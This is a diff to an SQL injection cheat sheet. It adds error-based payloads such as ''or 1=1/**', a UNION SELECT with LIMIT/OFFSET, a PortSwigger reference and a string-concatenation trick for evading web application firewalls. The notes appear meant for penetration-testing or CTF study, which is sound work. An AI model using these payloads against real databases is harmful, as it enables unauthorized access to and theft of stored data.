@@ -38,6 +38,9 @@ Error Based: Basic payloads to check for existence of SQL vuln
 " or 1=1-- 
 " or '1'='1'--
 " or '1'='1';--
+
+'or 1=1/**
+' UNION SELECT * from <tablename> LIMIT 1 OFFSET 1
 ```
 
 Boolean Based: Proving existence with AND , OR injections
@@ -110,6 +113,12 @@ SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sql
 ## Bypassing WAF
 https://securityonline.info/sql-injection-9-ways-bypass-web-application-firewall/
 
+https://portswigger.net/support/sql-injection-bypassing-common-filters
+
+1. Use `||` for concatenating strings in SQL:
+```
+`adm'||'in'` === `admin`
+```
 
 ## References:
 [SQLite Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
@@ -121,3 +130,7 @@ https://securityonline.info/sql-injection-9-ways-bypass-web-application-firewall
 ```
 ' UNION blah blah LIMIT 1 OFFSET 1
 ```
+
+2. `||` for string concatenation
+
+
